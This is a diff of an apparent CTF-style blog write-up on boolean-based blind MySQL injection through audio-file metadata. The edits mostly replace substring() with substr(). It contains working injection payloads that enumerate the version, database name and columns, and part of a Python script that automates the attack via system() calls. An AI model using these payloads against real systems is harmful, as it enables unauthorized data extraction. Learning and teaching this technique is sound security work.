@@ -54,7 +54,7 @@ while True:
 <br>
 Finally i found out what i was exploiting was boolean based blind SQLi. The injection point was `' or SQLCOMMAND or '`. For futher confirmation, i did this which i thought would eval to true and did evaluate to true `' and 2=2 or 99=99 or '`.
 # Exploing SQLi Blindly
-The insanity starts here. I DM'ed **Blindhero**, another of my nice mentor/friend for some tips on how to get dbms, tables.. He told me to use `SELECT CASE WHEN` which works on `Sqlite`. Unfortunately, it didnt work as it was `MySQL`. He also said about how to get database, table and so on. He constantly helped me debug my payload. Now, i started by very basic information gathering payload `' and 2=2 or (SELECT substring(version(),1,1)=5) or '`  returned 1,which is equivalent to boolean true. 
+The insanity starts here. I DM'ed **Blindhero**, another of my nice mentor/friend for some tips on how to get dbms, tables.. He told me to use `SELECT CASE WHEN` which works on `Sqlite`. Unfortunately, it didnt work as it was `MySQL`. He also said about how to get database, table and so on. He constantly helped me debug my payload. Now, i started by very basic information gathering payload `' and 2=2 or (SELECT substr(version(),1,1)=5) or '`  returned 1,which is equivalent to boolean true. 
 
 Then, moving forward to finding current database which was not easy but ok. Since, it was boolean based blind doing it by hand would take ages. So, i coded some exploit. Crafting query took time but eventually this `' and 2=2 or (SELECT substr(database(),1,1)='a')` returned true. Here's some of my code with explanation *(shitty code)*.
 ```python
@@ -95,7 +95,7 @@ class SQLExploit:
     def setcmd(self, character):
         #Finds database
         try:
-            command = 'mid3v2 -a "' + get_random_string(5) +   "' and 2=2 or (select substring(database()," + str(self.pos) + ",1)='" + character +"') or '" + '" testing.mp3'
+            command = 'mid3v2 -a "' + get_random_string(5) +   "' and 2=2 or (select substr(database()," + str(self.pos) + ",1)='" + character +"') or '" + '" testing.mp3'
             print(command)
             system(command)
         except Exception as E:
@@ -117,9 +117,9 @@ Unfortunately, its hard to include in payload thats why i did `substr()` method.
 I also modified `setcmd()` function slightly and exploiting gives me `audioedit` which is same as database name.
 
 Ah, i was tired and irritated. Took some caffeine again and got started. For numbers of columns in that table, querying information schema i used this:   
-`' and 2=2 or (SELECT substring(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
+`' and 2=2 or (SELECT substr(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
 <br>
-So, columns number are 5, now what. Now, this part was very tough to debug. I just went mad trying to find out what was the problem. It took about 3 hours to find what was the problem. I crafted about 4-5 payloads, none of them were working.
+So, number of columns are 5, now what. Now, this part was very tough to debug. I just went mad trying to find out what was the problem. It took about 3 hours to find what was the problem. I crafted about 4-5 payloads, none of them were working.
 ```sql
 ' and 2=2 or (SELECT substr(column_name,1,1) FROM information_schema.columns where table_name='audioedit' limit 1 OFFSET 1)='a' or '
 ' and 2=2 or (SELECT((SELECT count(*) FROM information_schema.columns WHERE table_name = 'audioedit' and column_name LIKE 'xx%')=1)) or '
